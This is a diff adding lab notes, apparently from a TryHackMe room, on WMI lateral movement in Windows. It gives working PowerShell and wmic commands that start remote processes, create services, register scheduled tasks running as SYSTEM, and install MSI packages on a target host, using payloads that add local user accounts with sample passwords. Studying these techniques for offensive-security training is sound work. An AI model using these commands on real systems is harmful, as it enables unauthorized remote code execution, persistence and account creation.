@@ -101,4 +101,81 @@ $Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionO
     - 135/TCP, 49152-65535/TCP (DCERPC)
     - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
 - Required Group Memberships: Administrators  
+
 We can remotely spawn a process from Powershell by leveraging Windows Management Instrumentation (WMI), sending a WMI request to the Win32_Process class to spawn the process under the session we created before:
+```
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+```
+On legacy systems, the same can be done using wmic from the command prompt:
+```
+wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
+```
+
+### Creating Services Remotely with WMI
+- Ports:
+    - 135/TCP, 49152-65535/TCP (DCERPC)
+    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators  
+
+We can create services with WMI through Powershell. To create a service called THMService2, we can use the following command:
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
+Name = "THMService2";
+DisplayName = "THMService2";
+PathName = "net user munra2 Pass123 /add"; # Your payload
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}
+```
+And then, we can get a handle on the service and start it with the following commands:
+```
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
+
+Invoke-CimMethod -InputObject $Service -MethodName StartService
+```
+Finally, we can stop and delete the service with the following commands:
+```
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+```
+
+### Creating Scheduled Tasks Remotely with WMI
+- Ports:
+    - 135/TCP, 49152-65535/TCP (DCERPC)
+    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators  
+
+We can create and execute scheduled tasks by using some cmdlets available in Windows default installations:
+```
+# Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
+Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+To delete the scheduled task after it has been used, we can use the following command:
+```
+Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+### Installing MSI packages through WMI
+- Ports:
+    - 135/TCP, 49152-65535/TCP (DCERPC)
+    - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+- Required Group Memberships: Administrators
+MSI is a file format used for installers. If we can copy an MSI package to the target system, we can then use WMI to attempt to install it for us. The file can be copied in any way available to the attacker. Once the MSI file is in the target system, we can attempt to install it by invoking the Win32_Product class through WMI:
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+```
+We can achieve the same by us using wmic in legacy systems:
+```
+wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
+```
+
+
